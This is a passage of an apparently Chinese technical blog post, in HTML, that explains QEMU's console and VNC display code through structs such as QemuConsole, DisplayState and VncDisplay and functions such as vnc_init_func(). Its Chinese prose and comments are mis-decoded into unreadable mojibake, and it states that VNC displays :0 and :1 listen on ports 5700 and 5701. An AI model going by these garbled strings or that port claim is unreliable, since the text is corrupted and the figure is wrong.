class="hljs-type">int</span> index;<br>    <span class="hljs-type">console_type_t</span> console_type; <span class="hljs-comment">// æ§åˆ¶å°ç±»å‹</span><br>    DisplayState *ds;           <span class="hljs-comment">// å¯¹åº”çš„æ˜¾ç¤ºè®¾å¤‡</span><br>    DisplaySurface *surface;<br>    DisplayScanout scanout;<br>    <span class="hljs-type">int</span> dcls;<br>    DisplayGLCtx *gl;<br>    <span class="hljs-type">int</span> gl_block;<br>    QEMUTimer *gl_unblock_timer;<br>    <span class="hljs-type">int</span> window_id;<br><br>    <span class="hljs-comment">/* å›¾å½¢åŒ–æ§åˆ¶å°çŠ¶æ€.  */</span><br>    Object *device; <span class="hljs-comment">// å¯¹åº”çš„å›¾å½¢åŒ–è®¾å¤‡</span><br>    <span class="hljs-type">uint32_t</span> head;<br>    QemuUIInfo ui_info;<br>    QEMUTimer *ui_timer;  <span class="hljs-comment">// å¯¹åº”çš„ Timer</span><br>    <span class="hljs-type">const</span> GraphicHwOps *hw_ops;  <span class="hljs-comment">// ç¡¬ä»¶æ“ä½œå‡½æ•°</span><br>    <span class="hljs-type">void</span> *hw;<br><br>    <span class="hljs-comment">/* å­—ç¬¦æ§åˆ¶å°çŠ¶æ€ */</span><br>    <span class="hljs-type">int</span> width;<br>    <span class="hljs-type">int</span> height;<br>    <span class="hljs-type">int</span> total_height;<br>    <span class="hljs-type">int</span> backscroll_height;<br>    <span class="hljs-type">int</span> x, y;<br>    <span class="hljs-type">int</span> x_saved, y_saved;<br>    <span class="hljs-type">int</span> y_displayed;<br>    <span class="hljs-type">int</span> y_base;<br>    TextAttributes t_attrib_default; <span class="hljs-comment">/* é»˜è®¤å­—ç¬¦å±æ€§ */</span><br>    TextAttributes t_attrib; <span class="hljs-comment">/* å½“å‰æ´»åŠ¨å­—ç¬¦å±æ€§ */</span><br>    TextCell *cells;<br>    <span class="hljs-type">int</span> text_x[<span class="hljs-number">2</span>], text_y[<span class="hljs-number">2</span>], cursor_invalidate;<br>    <span class="hljs-type">int</span> echo;<br><br>    <span class="hljs-type">int</span> update_x0;<br>    <span class="hljs-type">int</span> update_y0;<br>    <span class="hljs-type">int</span> update_x1;<br>    <span class="hljs-type">int</span> update_y1;<br><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">TTYState</span> <span class="hljs-title">state</span>;</span><br>    <span class="hljs-type">int</span> esc_params[MAX_ESC_PARAMS];<br>    <span class="hljs-type">int</span> nb_esc_params;<br><br>    Chardev *chr;<br>    <span class="hljs-comment">/* å…ˆè¿›å…ˆå‡ºçš„æŒ‰é”®è¾“å…¥ */</span><br>    Fifo8 out_fifo;<br>    CoQueue dump_queue;<br><br>    QTAILQ_ENTRY(QemuConsole) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯¹äºå›¾å½¢åŒ–è®¾å¤‡ç›¸å…³çš„æ“ä½œï¼Œä¸»è¦é€šè¿‡å‡½æ•°è¡¨ <code>hw_ops</code> æ¥å®Œæˆï¼Œå¯¹äºçº¯å­—ç¬¦å‹æ˜¾ç¤ºè®¾å¤‡è€Œè¨€ï¼Œè¯¥å‡½æ•°è¡¨ä¸º <code>text_console_ops</code>ï¼Œå¯¹äºæ™®é€šçš„ VGA è®¾å¤‡è€Œè¨€åˆ™ä¸º <code>vga_ops</code>ï¼Œæˆ‘ä»¬åœ¨åé¢ä¼šçœ‹åˆ°è¿™ä¸€ç‚¹ã€‚</p><p>QemuConsole çš„åˆ›å»ºä¸»è¦é€šè¿‡ <code>new_console()</code> æ¥å®Œæˆï¼Œåœ¨ Qemu ä¸­æœ‰ä¸€ä¸ªå…¨å±€çš„ QemuConsole å˜é‡ <code>consoles</code>ï¼Œæ¯å½“åˆ›å»ºä¸€ä¸ªæ–°çš„ QemuConsole åå°±ä¼šé€šè¿‡å°¾æ’æ³•æ’å…¥åˆ°è¿™ä¸ªå…¨å±€çš„ QemuConsole é“¾è¡¨ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-title function_">QTAILQ_HEAD</span><span class="hljs-params">(, QemuConsole)</span> consoles =<br>    QTAILQ_HEAD_INITIALIZER(consoles);<br></code></pre></td></tr></table></figure><blockquote><p>ä»€ä¹ˆæ˜¯ <code>console</code>ï¼Ÿç‹­ä¹‰åœ°è¯´ï¼Œconsole æœ€åˆæŒ‡çš„å°±æ˜¯ä¸€ä¸ªè®¾å¤‡çš„æ§åˆ¶å°ï¼Œ<em>åŒ…å«äº†æ˜¾ç¤ºè®¾å¤‡ä¸åŸºæœ¬è¾“å…¥è®¾å¤‡</em> ï¼Œä¸ terminal ä¸åŒï¼Œconsole é€šå¸¸æ˜¯æœºå™¨è‡ªå¸¦çš„ï¼Œè€Œ terminal åˆ™å¾€å¾€æŒ‡çš„æ˜¯éœ€è¦æˆ‘ä»¬é€šè¿‡ä¸²å£è¿›è¡Œè¿æ¥çš„å¤–éƒ¨è®¾å¤‡<br>ä¸è¿‡éšç€æ—¶ä»£çš„å‘å±•ï¼Œç°åœ¨å¯¹äº console ä¸ terminal ä¹‹é—´æ¦‚å¿µçš„å®šä¹‰åŒºåˆ«ä¹Ÿé€æ¸è¶‹äºæ¨¡ç³Šï¼Œç°åœ¨çš„æœºå™¨å¤§éƒ½ä¸å†æœ‰å®ä½“çš„ consoleï¼Œè€Œé‡‡ç”¨è½¯ä»¶æ¨¡æ‹Ÿçš„æ–¹å¼ï¼Œä¾‹å¦‚åœ¨ Linux ä¸­å®šä¹‰äº† 6 ä¸ª virtual terminalï¼ˆå¯ä»¥ä½¿ç”¨ <code>ctrl + f1 ~ f6</code> è¿›è¡Œåˆ‡æ¢ï¼‰ï¼Œè€Œå½“æˆ‘ä»¬å‘ <code>/dev/console</code> è¾“å…¥æ—¶ï¼Œåˆ™ä¼šè¾“å‡ºåˆ°å½“å‰çš„ virtual terminal ä¸Šï¼›è€Œåœ¨ä¸€äº›å…¶ä»–çš„ç±» UNIX ç³»ç»Ÿä¸­ï¼Œconsole åˆ™å¾€å¾€è¢«å›ºå®šä¸ºç¬¬ä¸€ä¸ª virtual terminal</p></blockquote><h3 id="IIã€DisplayState-æ˜¾ç¤ºè®¾å¤‡æ€»çŠ¶æ€">IIã€DisplayState - æ˜¾ç¤ºè®¾å¤‡æ€»çŠ¶æ€</h3><p>åœ¨ Qemu å½“ä¸­ä½¿ç”¨ä¸€ä¸ª <code>DisplayState</code> è¡¨ç¤ºæ˜¾ç¤ºè®¾å¤‡çš„æ€»çŠ¶æ€ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/console.c</code> ä¸­,å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DisplayState</span> &#123;</span><br>    QEMUTimer *gui_timer;   <span class="hljs-comment">// å¯¹åº”æ›´æ–°çš„ timer</span><br>    <span class="hljs-type">uint64_t</span> last_update;   <span class="hljs-comment">// ä¸Šæ¬¡æ›´æ–°æ—¶é—´</span><br>    <span class="hljs-type">uint64_t</span> update_interval;<br>    <span class="hljs-type">bool</span> refreshing;<br>    <span class="hljs-type">bool</span> have_gfx;          <span class="hljs-comment">// æ˜¯å¦æœ‰å›¾å½¢åŒ–æ˜¾ç¤º</span><br>    <span class="hljs-type">bool</span> have_text;         <span class="hljs-comment">// æ˜¯å¦æœ‰çº¯æ–‡æœ¬æ˜¾ç¤º</span><br><br>    QLIST_HEAD(, DisplayChangeListener) listeners;  <span class="hljs-comment">// å„ä¸ª Display çš„ Listener çš„é“¾è¡¨</span><br>&#125;;<br><br><span class="hljs-type">static</span> DisplayState *display_state; <span class="hljs-comment">// å…¨å±€çš„ DisplayState</span><br></code></pre></td></tr></table></figure><p>é€šå¸¸è€Œè¨€ï¼Œä¸€ä¸ª DisplayState å¯ä»¥å¯¹åº”ç€å¤šä¸ª QemuConsoleï¼Œå› ä¸ºå…¶å¯ä»¥å¯¹åº”ç€å¤šä¸ª VGA è®¾å¤‡ï¼Œå› æ­¤ç›¸åº”åœ°å…¶å¯ä»¥æœ‰ç€å¤šä¸ª <code>DisplayChangeListener</code> æ¥ç›‘è§†å¤šä¸ª Display è®¾å¤‡çš„æ›´æ”¹ï¼Œå¤šä¸ª <code>DisplayChangeListener</code> ä¹‹é—´è¿æˆä¸€ä¸ªé“¾è¡¨</p><h3 id="IIIã€DisplayChangeListener-ç›‘è§†å•ä¸ªæ˜¾ç¤ºè®¾å¤‡çš„æ›´æ”¹">IIIã€DisplayChangeListener - ç›‘è§†å•ä¸ªæ˜¾ç¤ºè®¾å¤‡çš„æ›´æ”¹</h3><p><code>DisplayChangeListener</code> ç»“æ„ä½“ç”¨äº<strong>ç›‘è§†å•ä¸ªæ˜¾ç¤ºè®¾å¤‡çš„æ›´æ”¹</strong>å¹¶è¿›è¡Œç›¸å…³æ“ä½œï¼Œå› æ­¤ä¸€ä¸ª DisplayChangeListener åº”å½“ä¸ä¸€ä¸ªç‰¹å®šçš„ QemuConsole ç›¸å…³è”</p><p>é€šå¸¸è€Œè¨€ä¸€ä¸ª QemuConsole å¯ä»¥æœ‰ç€å¤šä¸ª DisplayChangeListenerï¼ˆä¾‹å¦‚ä¸€ä¸ª QemuConsole å¯ä»¥å¯¹åº”æœ‰ç€ä¸€ä¸ª VNC çš„ DCL + ä¸€ä¸ªæœ¬åœ°è™šæ‹Ÿç»ˆç«¯çš„ DCLï¼‰</p><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>include/ui/console.h</code> ä¸­,å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DisplayChangeListener</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span> update_interval;<br>    <span class="hljs-type">const</span> DisplayChangeListenerOps *ops;<br>    DisplayState *ds;<br>    QemuConsole *con;<br><br>    QLIST_ENTRY(DisplayChangeListener) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å…¶æˆå‘˜ <code>ops</code> ä¸ºä¸€ä¸ª <code>DisplayChangeListenerOps</code> å‡½æ•°è¡¨ï¼Œè¯¥å‡½æ•°è¡¨ä¸­åŒ…å«å¤§é‡çš„å‡½æ•°æŒ‡é’ˆï¼Œç”¨ä»¥è¿›è¡Œæ˜¾ç¤ºç›¸å…³çš„æ“ä½œï¼ˆä¾‹å¦‚ <code>dpy_refresh</code> æŒ‡é’ˆç”¨äºåˆ·æ–°æ˜¾ç¤ºï¼Œ <code>gfx_hw_update</code> æŒ‡é’ˆç”¨äºè¿›è¡Œæ˜¾å¡ç¡¬ä»¶ç›¸å…³æ›´æ–°ï¼Œæˆ‘ä»¬åœ¨åé¢ä¼šçœ‹åˆ°è¿™ä¸€ç‚¹ï¼‰</p><h2 id="ä¸€ã€init-displaystate-éå†æ‰€æœ‰çš„-QemuConsole-å¹¶åŠ å…¥-qom-treeï¼Œåˆå§‹åŒ–å­—ç¬¦å‹-console">ä¸€ã€init_displaystate() - éå†æ‰€æœ‰çš„ QemuConsole å¹¶åŠ å…¥ qom treeï¼Œåˆå§‹åŒ–å­—ç¬¦å‹ console</h2><p><code>init_displaystate()</code> ä¸»è¦ç”¨äºå¯¹ QemuConsole è¿›è¡Œåˆå§‹åŒ–çš„å·¥ä½œï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç”± main() è°ƒç”¨, åœ¨åˆ›å»º QemuConsoles ä¹‹å</span><br><span class="hljs-comment"> * åœ¨åˆå§‹åŒ– ui (sdl/vnc/...) ä¹‹å‰.</span><br><span class="hljs-comment"> */</span><br>DisplayState *<span class="hljs-title function_">init_displaystate</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    gchar *name;<br>    QemuConsole *con;<br><br>    get_alloc_displaystate();<br>    QTAILQ_FOREACH(con, &amp;consoles, next) &#123;<br>        <span class="hljs-keyword">if</span> (con-&gt;console_type != GRAPHIC_CONSOLE &amp;&amp;<br>            con-&gt;ds == <span class="hljs-literal">NULL</span>) &#123;<br>            text_console_do_init(con-&gt;chr, display_state);<br>        &#125;<br><br>        <span class="hljs-comment">/* åœ¨è¿™é‡Œè¿æ¥ä¸Š qom tree (è€Œä¸åœ¨ new_console()), </span><br><span class="hljs-comment">         * åœ¨æ‰€æœ‰çš„ QemuConsoles éƒ½è¢«åˆ›å»ºåï¼Œå…¶é¡ºåºä¸åºå·</span><br><span class="hljs-comment">         * éƒ½å°†ä¸å†æ›´æ”¹ */</span><br>        name = g_strdup_printf(<span class="hljs-string">&quot;console[%d]&quot;</span>, con-&gt;index);<br>        object_property_add_child(container_get(object_get_root(), <span class="hljs-string">&quot;/backend&quot;</span>),<br>                                  name, OBJECT(con));<br>        g_free(name);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> display_state;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸»è¦æ˜¯éå†å…¨å±€çš„ QemuConsole é“¾è¡¨å¹¶å°†å…¶åŠ å…¥åˆ° qom tree ä¸­ï¼Œè‹¥éå›¾å½¢åŒ–çš„ console åˆ™è¿˜ä¼šè°ƒç”¨ <code>text_console_do_init()</code> è¿›è¡Œåˆå§‹åŒ–å·¥ä½œï¼Œä¸»è¦æ˜¯å°†å…¶è®¾ä¸ºæ ‡å‡†çš„ <code>80*24</code> çš„å­—ç¬¦æ˜¾ç¤ºè®¾å¤‡ï¼Œå¹¶å°†å…¶ <code>hw_ops</code> è®¾ä¸º <code>text_console_ops</code>ï¼Œå…¶ <code>hw</code> åˆ™æŒ‡å‘ QemuConsole è‡ªèº«</p><h2 id="äºŒã€qemu-display-init-è°ƒç”¨å¯¹åº”ç±»å‹-QemuDisplay-çš„-init-å‡½æ•°è¿›è¡Œåˆå§‹åŒ–">äºŒã€qemu_display_init() - è°ƒç”¨å¯¹åº”ç±»å‹ QemuDisplay çš„ init å‡½æ•°è¿›è¡Œåˆå§‹åŒ–</h2><p>è¯¥å‡½æ•°åŒæ ·å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_display_init</span><span class="hljs-params">(DisplayState *ds, DisplayOptions *opts)</span><br>&#123;<br>    assert(opts-&gt;type &lt; DISPLAY_TYPE__MAX);<br>    <span class="hljs-keyword">if</span> (opts-&gt;type == DISPLAY_TYPE_NONE) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    assert(dpys[opts-&gt;type] != <span class="hljs-literal">NULL</span>);<br>    dpys[opts-&gt;type]-&gt;init(ds, opts);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ dpys æ˜¯ä¸€ä¸ª <code>QemuDisplay</code> ç±»å‹çš„å…¨å±€æ•°ç»„ï¼Œå®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œè¡¨ç¤º Qemu æ‰€æ”¯æŒçš„æ‰€æœ‰æ˜¾ç¤ºç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>qemu_display_register()</code> å°†æ˜¾ç¤ºç±»å‹æ³¨å†Œåˆ°è¯¥æ•°ç»„ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> QemuDisplay *dpys[DISPLAY_TYPE__MAX];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_display_register</span><span class="hljs-params">(QemuDisplay *ui)</span><br>&#123;<br>    assert(ui-&gt;type &lt; DISPLAY_TYPE__MAX);<br>    dpys[ui-&gt;type] = ui;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>QemuDisplay</code> ç»“æ„ä½“å®šä¹‰äº <code>ui/console.h</code> ä¸­ï¼Œè¡¨ç¤º Qemu æ‰€æ”¯æŒçš„å•ä¸ªæ˜¾ç¤ºç±»å‹ï¼Œä¸»è¦å°±æ˜¯ç±»å‹ + åˆå§‹åŒ–çš„å‡½æ•°æŒ‡é’ˆï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QemuDisplay</span> &#123;</span><br>    DisplayType type;<br>    <span class="hljs-type">void</span> (*early_init)(DisplayOptions *opts);<br>    <span class="hljs-type">void</span> (*init)(DisplayState *ds, DisplayOptions *opts);<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>ä¸è¿‡ç»ç¬”è€…è°ƒè¯•é€šå¸¸æƒ…å†µä¸‹ä¸ç‰¹å®šæŒ‡å®šçš„è¯éƒ½ä¼šæ˜¯ <code>DISPLAY_TYPE_NONE</code></p></blockquote><h1>0x02. vnc_init_func() - åˆå§‹åŒ–å•ä¸ª VNC Server</h1><p>åœ¨ä¸€ä¸ª Qemu å®ä¾‹å½“ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸åªä¼šä½¿ç”¨åˆ°ä¸€ä¸ª VGA è®¾å¤‡ï¼ˆä¹Ÿå¯ä»¥å¤šä¸ªï¼‰ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥åŒæ—¶å¯åŠ¨å¤šä¸ª VNC Serverï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥é™„åŠ å¯åŠ¨å‚æ•° <code>-vnc yourip:0 -vnc yourip:1</code>ï¼Œæ­¤æ—¶ Qemu å°±ä¼šåœ¨ 5700 ä¸ 5701 ç«¯å£ä¸Šå¯åŠ¨ä¸¤ä¸ª VNC æœåŠ¡å™¨ï¼Œè€Œæ¯ä¸ª VNC Server çš„å¯åŠ¨éƒ½æ˜¯é€šè¿‡ <code>vnc_init_func()</code> æ¥å®Œæˆçš„</p><p>å½“æˆ‘ä»¬åªæœ‰ä¸€ä¸ª VGA è®¾å¤‡è¾“å‡ºæ—¶ï¼Œå…¶è¾“å‡ºä¼šè¢«åŒæ—¶æ›´æ–°ç»™å¤šä¸ª VNC Clientï¼Œæ­¤æ—¶å¤šä¸ª VNC Client æ‰€è·å–åˆ°çš„ç”»é¢æ˜¯ç›¸åŒçš„</p><p><code>vnc_init_func()</code> å®šä¹‰äº <code>ui/vnc.c</code> ä¸­ï¼Œæ¯”è¾ƒç®€çŸ­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vnc_init_func</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, QemuOpts *opts, Error **errp)</span><br>&#123;<br>    Error *local_err = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span> *id = (<span class="hljs-type">char</span> *)qemu_opts_id(opts);<br><br>    assert(id);<br>    vnc_display_init(id, &amp;local_err);<br>    <span class="hljs-keyword">if</span> (local_err) &#123;<br>        error_propagate(errp, local_err);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    vnc_display_open(id, &amp;local_err);<br>    <span class="hljs-keyword">if</span> (local_err != <span class="hljs-literal">NULL</span>) &#123;<br>        error_propagate(errp, local_err);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦åšäº†ä¸¤ä»¶äº‹ï¼š</p><ul><li><code>vnc_display_init()</code>ï¼šåˆå§‹åŒ–ä¸€ä¸ª <code>VncDisplay</code> å®ä¾‹</li><li><code>vnc_display_open()</code>ï¼šå¯åŠ¨ä¸€ä¸ª VNC Server</li></ul><p><code>vnc_display_open()</code> ä¸»è¦å°±æ˜¯å•çº¯çš„åˆ›å»ºä¸€ä¸ªæ™®é€šçš„ serverï¼Œä»¥åŠä¸€äº›å’Œ VNC åè®®å…·ä½“ç»†èŠ‚ç›¸å…³çš„éƒ¨åˆ†ï¼Œæ•…æˆ‘ä»¬æ¥ä¸‹æ¥ä¸»è¦åˆ†æ <code>vnc_display_init()</code></p><h2 id="ã€‡ã€VNC-ç›¸å…³ç»“æ„ä½“">ã€‡ã€VNC ç›¸å…³ç»“æ„ä½“</h2><h3 id="Iã€VncDisplay-å•ä¸ª-VNC-Server-å®ä¾‹">Iã€VncDisplay - å•ä¸ª VNC Server å®ä¾‹</h3><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/vnc.h</code> ä¸­ï¼Œè¡¨ç¤ºå•ä¸ª VNC Server å®ä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncDisplay</span></span><br><span class="hljs-class">&#123;</span><br>    QTAILQ_HEAD(, VncState) clients;<br>    <span class="hljs-type">int</span> num_connecting;<br>    <span class="hljs-type">int</span> num_shared;<br>    <span class="hljs-type">int</span> num_exclusive;<br>    <span class="hljs-type">int</span> connections_limit;<br>    VncSharePolicy share_policy;<br>    QIONetListener *listener;<br>    QIONetListener *wslistener;<br>    DisplaySurface *ds;<br>    DisplayChangeListener dcl;<br>    <span class="hljs-type">kbd_layout_t</span> *kbd_layout;<br>    <span class="hljs-type">int</span> lock_key_sync;<br>    QEMUPutLEDEntry *led;<br>    <span class="hljs-type">int</span> ledstate;<br>    QKbdState *kbd;<br>    QemuMutex mutex;<br><br>    QEMUCursor *cursor;<br>    <span class="hljs-type">int</span> cursor_msize;<br>    <span class="hljs-type">uint8_t</span> *cursor_mask;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncSurface</span> <span class="hljs-title">guest</span>;</span>   <span class="hljs-comment">/* guest visible surface (aka ds-&gt;surface) */</span><br>    <span class="hljs-type">pixman_image_t</span> *server;    <span class="hljs-comment">/* vnc server surface */</span><br>    <span class="hljs-type">int</span> true_width; <span class="hljs-comment">/* server surface width before rounding up */</span><br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *id;<br>    QTAILQ_ENTRY(VncDisplay) next;<br>    <span class="hljs-type">bool</span> is_unix;<br>    <span class="hljs-type">char</span> *password;<br>    <span class="hljs-type">time_t</span> expires;<br>    <span class="hljs-type">int</span> auth;<br>    <span class="hljs-type">int</span> subauth; <span class="hljs-comment">/* Used by VeNCrypt */</span><br>    <span class="hljs-type">int</span> ws_auth; <span class="hljs-comment">/* Used by websockets */</span><br>    <span class="hljs-type">int</span> ws_subauth; <span class="hljs-comment">/* Used by websockets */</span><br>    <span class="hljs-type">bool</span> lossy;<br>    <span class="hljs-type">bool</span> non_adaptive;<br>    <span class="hljs-type">bool</span> power_control;<br>    QCryptoTLSCreds *tlscreds;<br>    QAuthZ *tlsauthz;<br>    <span class="hljs-type">char</span> *tlsauthzid;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC_SASL</span><br>    VncDisplaySASL sasl;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    AudioState *audio_state;<br>&#125;;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™å‡ ä¸ªæˆå‘˜å˜é‡ï¼š</p><ul><li><code>clients</code>ï¼šè¿æ¥åˆ°è¯¥æœåŠ¡å™¨ä¸Šçš„æ‰€æœ‰å®¢æˆ·ç«¯ï¼Œæ¯ä¸ªå®¢æˆ·ç«¯ä¸ºä¸€ä¸ª <code>VncClient</code> å®ä¾‹ï¼Œå¤šä¸ª <code>VncClient</code> å®ä¾‹é—´å½¢æˆä¸€ä¸ªé“¾è¡¨</li><li><code>ds</code>ï¼š</li><li><code>dcl</code>ï¼šè¯¥ VNC Server æ‰€ç›‘å¬çš„ QemuConsole çš„ç›‘å¬å™¨ï¼Œå½“å¯¹åº”çš„ QemuConsole å‘ç”Ÿæ›´æ”¹æ—¶ä¾¿ä¼šè°ƒç”¨ <code>dcl-&gt;ops</code> ä¸­å¯¹åº”å‡½æ•°æŒ‡é’ˆ</li><li><code>next</code>ï¼šå¤šä¸ª VncDisplay ä¹‹é—´äº’ç›¸è¿æ¥å½¢æˆä¸€ä¸ªé“¾è¡¨</li></ul><p>åŒæ—¶å­˜åœ¨ç€ä¸€ä¸ªå…¨å±€å˜é‡ <code>vnc_displays</code>ï¼ŒQemu ä¸­æ‰€æœ‰çš„ VncDisplay éƒ½æŒ‚è½½åœ¨è¯¥é“¾è¡¨ä¸Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-title function_">QTAILQ_HEAD</span><span class="hljs-params">(, VncDisplay)</span> vnc_displays =<br>    QTAILQ_HEAD_INITIALIZER(vnc_displays);<br></code></pre></td></tr></table></figure><h3 id="IIã€VncState-å•ä¸ª-VNC-è¿æ¥ï¼ˆVNC-Clientï¼‰">IIã€VncState - å•ä¸ª VNC è¿æ¥ï¼ˆVNC Clientï¼‰</h3><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/vnc.h</code> ä¸­ï¼Œè¡¨ç¤ºè¿æ¥åˆ°ç‰¹å®š VNC Server ä¸Šçš„å•ä¸ª VNC Client å®ä¾‹ï¼Œå…¶ä¸­åŒ…å«å®¢æˆ·ç«¯çš„å„ç§ä¿¡æ¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 